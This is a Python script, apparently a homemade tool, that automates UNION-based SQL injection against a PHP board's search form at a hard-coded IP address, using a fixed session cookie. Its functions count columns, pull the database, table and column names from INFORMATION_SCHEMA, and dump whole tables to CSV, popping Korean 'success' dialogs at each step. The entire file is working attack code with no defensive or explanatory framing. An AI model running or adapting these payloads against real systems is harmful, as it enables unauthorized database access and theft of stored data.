import requests
import re
from bs4 import BeautifulSoup
import pandas
from tkinter import messagebox

url = 'http://104.197.42.200/html/center/list.php?mode=search'
cookies = {'PHPSESSID': 'd42rp6qqm5fhj3dmn3830g74pq'}

check = 'different number of columns'
def count_board_columns(url, cookies):
    result = 0
    inject = '0'
    while 1:
        value = "' union select {}#".format(inject)
        params = {'find': 'subject', 'data' : value}
        response = requests.post(url,data=params, cookies=cookies)
        print(value)
        if check in response.text:
            result += 1
            inject += ', ' + str(result)
        else:
            break
    return result + 1

def find_db_name(values, url, cookies):
    value = " test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b626a71,(CASE WHEN (ISNULL(JSON_STORAGE_FREE(NULL))) THEN 1 ELSE 0 END),0x7162707871),NULL,NULL#"
    print(value)
    params = {'find': 'subject', 'data' : value}
    response = requests.post(url,data=params, cookies=cookies)
    res = BeautifulSoup(response.text, 'html.parser')
    for word in res.text.split():
        if 'JSON_STORAGE_FREE' in word:
            values.append(word.split('.')[0])
            messagebox.showinfo("성공", "db name 추출 완료")
            return values
    
def find_table_name(values, url, cookies, db_name):
    encoded = db_name.encode('utf-8').hex()
    value = " test'UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b626a71,JSON_ARRAYAGG(CONCAT_WS(0x6768726b7079,table_name)),0x7162707871),NULL,NULL FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN ({})#".format('0x' + encoded)
    params = {'find': 'subject', 'data' : value}
    print(value)
    response = requests.post(url,data=params, cookies=cookies)
    res = BeautifulSoup(response.text, 'html.parser')
    result = res.findAll('td')[3].text
    list = re.split('[\[\]]', result)[1]
    list = list.replace('"', '')
    for str in list.split(','):
        values.append(str.strip())
    messagebox.showinfo("성공", "table name 추출 완료")
    return values

def find_column_name(values, url, cookies, db_name, table_name):
    encode_db = db_name.encode('utf-8').hex()
    encode_table = table_name.encode('utf-8').hex()
    value = "test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b626a71,JSON_ARRAYAGG(CONCAT_WS(0x6768726b7079,column_name)),0x7162707871),NULL,NULL FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x{} AND table_schema=0x{}#".format(encode_table, encode_db)
    params = {'find': 'subject', 'data' : value}
    print(value)
    response = requests.post(url,data=params, cookies=cookies)
    res = BeautifulSoup(response.text, 'html.parser')
    result = res.findAll('td')[3].text
    list = re.split('[\[\]]', result)[1]
    list = list.replace('"', '')
    for str in list.split(','):
        values.append(str.strip())
    print(values)
    messagebox.showinfo("성공", "column name 추출 완료")
    return values

def dump_data(url, cookies, db_name, table_name, column_list):
    injectColumn = ''
    for str in column_list:
        injectColumn += "CONCAT_WS(':', '{}', {}),".format(str, str)
    injectColumn = injectColumn[:-1]
    value = "pw' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(JSON_ARRAYAGG(CONCAT_WS('---',{}))),NULL,NULL FROM {}.{}#".format(injectColumn, db_name, table_name)
    print(value)
    params = {'find': 'subject', 'data' : value}
    response = requests.post(url,data=params, cookies=cookies)
    res = BeautifulSoup(response.text, 'html.parser')
    result = res.findAll('td')[3].text.split(',')
    dict = {}
    for str in column_list:
        dict[str] = []
    for str in result:
        str = re.sub('[\[\]" ]', '', str)
        vars = str.split('---')
        for data in vars:
            keyValue = data.split(':')
            if len(keyValue) == 1 or keyValue[1] == '':
                dict[keyValue[0]].append('NULL')
            else:
                dict[keyValue[0]].append(keyValue[1])
            
    dataFrame = pandas.DataFrame(dict)
    dataFrame.to_csv('{}.csv'.format(table_name))
    messagebox.showinfo("성공", "data dump 완료")
    return(dict)
